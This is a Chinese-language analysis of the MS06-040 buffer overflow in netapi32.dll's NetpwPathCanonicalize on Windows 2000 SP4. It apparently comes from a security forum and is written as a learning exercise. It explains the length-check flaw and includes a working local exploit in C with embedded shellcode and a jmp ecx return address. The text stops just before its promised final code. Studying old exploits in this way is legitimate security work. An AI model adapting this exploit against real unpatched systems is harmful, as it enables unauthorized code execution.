
这次对于`ms06_040`漏洞的分析过程中，漏洞的原理还是比较简单的，难点其实在于后期的远程利用以及对于`shellcode`的修改。和正常的编程相比，`shellcode`的编写必须更加仔细，而且要时刻保持“短小精悍”。

其实我认为上面的代码还是存在一些缺陷的，因为使用`jmp esp`做跳板，栈中保存的一些数据就必然会被覆盖一部分。当从`shellcode`回到正常代码之后，就会影响到寄存器值的恢复。

后来实验的过程中，我发现使用`jmp ecx`作为跳板应该还是有机会的。我不知道自己第一次使用`jmp ecx`做远程攻击时为什么会出现问题，但是后来那个问题就没再出现。

我也尝试使用`jmp ecx`做跳板进行了实验，`shellcode`的改动其实不大，就是`esp`寄存器的数值需要做调整。但是不知道为什么，`shellcode`在执行到`WSASocketA`函数调用的时候会失败（・∀・(・∀・(・∀・*）。

之后应该还会尝试`jmp ecx`的方法，但是不知道啥时候弄完了，这篇文章暂时到此为止。

*代码说明：大部分代码来源于0day，有我自己的修改，贴出的代码是我在实验过程中使用的，有出错→修正→调试的一个过程，最终代码以附件中为准。*

# 1. 漏洞说明

`MS06-040`位于`netapi32.dll`动态链接库的导出函数`NetpwPathCanonicalize()`中，该函数可以被RPC远程调用，其原型为：

```c
int NetpwPathCanonicalize(
    uint16 path[],
    uint8 can_path[],
    uint32 maxbuf,
    uint16 prefix[],
    uint32* pathtype,
    uint32 pathflags
);
```

功能就是将`prefix`与`path`使用`\`字符相连，输出到`can_path`中，`maxbuf`为输出的最大长度。

为查明漏洞成因，使用以下代码对其进行调试，实验使用的是`Win2000SP4`中的`netapi32.dll`。

```c
#include <windows.h>

typedef void (*MYPROC)(
    LPTSTR,
    LPTSTR,
    int,
    LPTSTR,
    long*,
    long
);

int main() {
    char path[0x320];
    char can_path[0x440];
    int maxbuf = 0x440;
    char prefix[0x100];
    long pathtype = 44;

    HINSTANCE LibHandle;
    MYPROC Trigger;
    char dll[] = "./netapi32.dll";
    char VulFunc[] = "NetpwPathCanonicalize";

    LibHandle = LoadLibrary(dll);
    Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc);

    memset(path, 0, sizeof(path));
    memset(path, 'a', sizeof(path) - 2);
    memset(prefix, 0, sizeof(prefix));
    memset(prefix, 'b', sizeof(prefix) - 2);

    (Trigger)(path, can_path, maxbuf, prefix, &pathtype, 0);
    FreeLibrary(LibHandle);

    return 0;
}
```

# 2. 漏洞成因

在计算字符串长度的时候使用的是`wcslen`函数，该函数用来计算宽字符串长度。因此，在计算大小为`0x10E`字节（不包括结束字符）的`prefix`长度时，返回的结果为`0x87`；计算大小为`0x31e`字节（不包括结束字符）的`path`长度时，返回的结果为`0x18f`。

在将字符串复制到栈中的时候，程序保留了`0x414`字节的空间：

![图片描述](https://bbs.kanxue.com/upload/attach/202105/600394_SE7KYCVTAJV3QGU.png)

在计算空间是否足够的时候，比较的是`0x18f+0x87+1=0x217`与`0x411`的大小。

这样计算得到的结论当然是空间足够。之后进行了`wcscat`的调用，将两组字符串都复制到栈中。在此之前，观察`EBP`的值为`0x12f698`；字符串复制完之后，查看栈中的情况：

![图片描述](https://bbs.kanxue.com/upload/attach/202105/600394_AB5RGPEPGHZ7JWM.png)

## 2.1. `0x411`这个数字是怎么回事？

在调试的时候，我比较疑惑`0x411`这个数字是怎么回事，是根据程序动态变化的，还是写死在代码里面的，于是仔细检查了一下。

如果在代码级别修改，调高`prefix`和`path`的大小，让两者之和大于`0x822`（按照代码中的检查逻辑就比`0x411`大了），结果发现程序根本没有到达`CanonicalizePathName`函数的调用。

后来调试了一下，发现在到达漏洞触发点之前，`NetpwPathCanonicalize()`函数会调用`NetpwPathType`函数，检查`prefix`的长度是否越界：

![图片描述](https://bbs.kanxue.com/upload/attach/202105/600394_KYYS2GQBKRJVKRQ.png)

上图检查了`prefix`的长度是否超过了`0x103`。所以这次设置`prefix`的大小为`0x206`，`path`的大小为`0x630`，最终发现`0x411`这个数值并没有发生变化。由于总长度为`(0x206-2+0x630-2)\2+1=0x41A`，超过了`0x411`，所以函数直接返回了`0x7B(ERROR_INVALID_NAME)`。

所以说`0x411`这个数是写死的。

# 3. 漏洞利用

仔细观察一下函数返回时栈中的情况以及寄存器的情况，寄存器：

![图片描述](https://bbs.kanxue.com/upload/attach/202105/600394_BYDBW4W7E2P5PZF.png)

而在栈中，`prefix`的起始地址为`0x12f284`，和`ECX`的值相同，所以可以把`jmp ecx`作为跳板指令。

`prefix`的长度为`0x100`，`shellcode`的长度为`0xa8`，可以放到`prefix`中。从上图中可以看到返回地址位于`path`的倒数9—12字节，所以得到下面的漏洞利用代码：

```c
#include <windows.h>

typedef void (*MYPROC)(
    LPTSTR,
    LPTSTR,
    int,
    LPTSTR,
    long*,
    long
);

char shellcode[] =
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

int main() {
    char path[0x320];
    char can_path[0x440];
    int maxbuf = 0x440;
    char prefix[0x100];
    long pathtype = 44;

    HINSTANCE LibHandle;
    MYPROC Trigger;
    char dll[] = "./netapi32.dll";
    char VulFunc[] = "NetpwPathCanonicalize";

    LibHandle = LoadLibrary(dll);
    Trigger = (MYPROC)GetProcAddress(LibHandle, VulFunc);

    memset(path, 0, sizeof(path));
    memset(path, 0x90, sizeof(path) - 2);
    memset(prefix, 0, sizeof(prefix));
    memset(prefix, 'a', sizeof(prefix) - 2);
    memcpy(prefix, shellcode, 168);

    path[0x318] = 0x78;
    path[0x319] = 0x06;
    path[0x31a] = 0x49;
    path[0x31b] = 0x7e;

    (Trigger)(path, can_path, maxbuf, prefix, &pathtype, 0);
    FreeLibrary(LibHandle);

    return 0;
}
```

其中`0x7e490678`为内存中`jmp ecx`所在的地址。

## 3.1. 出现的问题

但是上面的代码出现了问题。通过调试，程序可以执行到`shellcode`的位置，但是……

![图片描述](https://bbs.kanxue.com/upload/attach/202105/600394_G848HB3V4TEXPJW.png)

执行到这里的时候，`sub esp, ebx`之后，得到`esp`的值为`0x12f2a8`。注意这里，这个地址已经是`shellcode`所在的位置了，也就是说之后的入栈操作会直接覆盖下面的`shellcode`指令，然后就变成了这样，/(ㄒoㄒ)/~~

![图片描述](https://bbs.kanxue.com/upload/attach/202105/600394_4BE2QW3GZDEVQAR.png)

## 3.2. 解决办法

我不知道自己实践过程中和0day有什么差异导致了现在这种结果，但是现在要想办法解决了。修改`shellcode`显然太麻烦了，鉴于`prefix`中还有足够的空间，所以可以直接改变`shellcode`的位置，把新的栈顶位置`0x12f2a8`绕过去。

最终的代码：

